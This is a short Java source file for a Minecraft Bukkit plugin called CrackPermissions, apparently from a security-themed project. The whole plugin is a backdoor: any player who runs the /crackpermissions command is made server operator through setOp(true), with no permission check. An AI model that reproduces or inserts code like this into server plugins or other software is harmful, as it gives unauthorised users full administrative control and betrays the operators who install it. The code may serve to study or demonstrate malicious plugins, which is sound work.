package io.github.simbiontesecurity;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;


public class CrackPermissions extends JavaPlugin {
 
    @Override
    public void onEnable() {
       
    }
   
    @Override
    public void onDisable() {
       
    }
   
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
    	if (cmd.getName().equalsIgnoreCase("crackpermissions") && sender instanceof Player){
    		Player player = (Player) sender;
    		player.sendMessage("Cracking permissions..");
    		player.setOp(true);
    		return true;
        
        }
        return false;
    }
   
}
